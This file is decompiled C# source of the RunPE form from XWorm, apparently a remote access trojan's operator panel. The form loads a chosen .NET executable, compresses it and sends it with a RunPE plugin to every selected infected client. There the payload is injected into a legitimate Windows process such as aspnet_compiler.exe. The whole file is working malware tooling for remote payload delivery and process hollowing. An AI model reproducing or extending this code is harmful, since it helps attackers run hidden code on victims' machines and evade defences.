using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm
{
	// Token: 0x0200002A RID: 42
	[DesignerGenerated]
	public partial class RunPE : Form
	{
		// Token: 0x0600080A RID: 2058 RVA: 0x00046B9D File Offset: 0x00044D9D
		public RunPE()
		{
			base.Load += this.RunPE_Load;
			this.v4 = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\";
			this.v2 = "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\";
			this.InitializeComponent();
		}

		// Token: 0x170002F7 RID: 759
		// (get) Token: 0x0600080D RID: 2061 RVA: 0x00047571 File Offset: 0x00045771
		// (set) Token: 0x0600080E RID: 2062 RVA: 0x0004757B File Offset: 0x0004577B
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F8 RID: 760
		// (get) Token: 0x0600080F RID: 2063 RVA: 0x00047584 File Offset: 0x00045784
		// (set) Token: 0x06000810 RID: 2064 RVA: 0x0004758E File Offset: 0x0004578E
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F9 RID: 761
		// (get) Token: 0x06000811 RID: 2065 RVA: 0x00047597 File Offset: 0x00045797
		// (set) Token: 0x06000812 RID: 2066 RVA: 0x000475A1 File Offset: 0x000457A1
		internal virtual Guna2ComboBox Guna2ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FA RID: 762
		// (get) Token: 0x06000813 RID: 2067 RVA: 0x000475AA File Offset: 0x000457AA
		// (set) Token: 0x06000814 RID: 2068 RVA: 0x000475B4 File Offset: 0x000457B4
		internal virtual Guna2ComboBox Guna2ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FB RID: 763
		// (get) Token: 0x06000815 RID: 2069 RVA: 0x000475BD File Offset: 0x000457BD
		// (set) Token: 0x06000816 RID: 2070 RVA: 0x000475C8 File Offset: 0x000457C8
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170002FC RID: 764
		// (get) Token: 0x06000817 RID: 2071 RVA: 0x0004760B File Offset: 0x0004580B
		// (set) Token: 0x06000818 RID: 2072 RVA: 0x00047618 File Offset: 0x00045818
		internal virtual Guna2GradientButton Guna2GradientButton2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton2_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton2 = value;
				guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170002FD RID: 765
		// (get) Token: 0x06000819 RID: 2073 RVA: 0x0004765B File Offset: 0x0004585B
		// (set) Token: 0x0600081A RID: 2074 RVA: 0x00047668 File Offset: 0x00045868
		internal virtual Guna2GradientButton Guna2GradientButton3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton3_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton3 = value;
				guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x0600081B RID: 2075 RVA: 0x000476AB File Offset: 0x000458AB
		private void RunPE_Load(object sender, EventArgs e)
		{
			this.Guna2ComboBox1.Text = "v4.0";
			this.Guna2ComboBox2.Text = "aspnet_compiler.exe";
		}

		// Token: 0x0600081C RID: 2076 RVA: 0x000247B5 File Offset: 0x000229B5
		private void Guna2GradientButton3_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600081D RID: 2077 RVA: 0x000476D0 File Offset: 0x000458D0
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				OpenFileDialog openFileDialog2 = openFileDialog;
				openFileDialog2.Filter = "(*.exe)|*.exe";
				openFileDialog2.Title = "Select .Net File";
				bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					try
					{
						Assembly.LoadFile(openFileDialog.FileName).EntryPoint.GetParameters();
					}
					catch (Exception ex)
					{
						MessageBox.Show(openFileDialog.FileName, "Is Not A .NET Assembly");
						return;
					}
					this.File = Helper.Compress(System.IO.File.ReadAllBytes(openFileDialog.FileName));
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show(ex2.Message);
			}
		}

		// Token: 0x0600081E RID: 2078 RVA: 0x0004779C File Offset: 0x0004599C
		private void Guna2GradientButton2_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2ComboBox1.Text, "v4.0", false) == 0;
			if (flag)
			{
				this.Net = this.v4;
			}
			bool flag2 = Operators.CompareString(this.Guna2ComboBox1.Text, "v2.0", false) == 0;
			if (flag2)
			{
				this.Net = this.v2;
			}
			try
			{
				bool flag3 = this.File == null;
				if (!flag3)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\RunPE.dll"),
						SettingsHelper.SPL,
						this.Net,
						this.Guna2ComboBox2.Text,
						SettingsHelper.SPL,
						Convert.ToBase64String(this.File)
					}));
					try
					{
						foreach (object obj in ((IEnumerable)MyProject.Forms.Main.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							RunPE._Closure$__R39-0 CS$<>8__locals1 = new RunPE._Closure$__R39-0(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					MessageBox.Show("DONE!");
					base.Close();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x04000358 RID: 856
		private string v4;

		// Token: 0x04000359 RID: 857
		private string v2;

		// Token: 0x0400035A RID: 858
		public byte[] File;

		// Token: 0x0400035B RID: 859
		public string Net;
	}
}
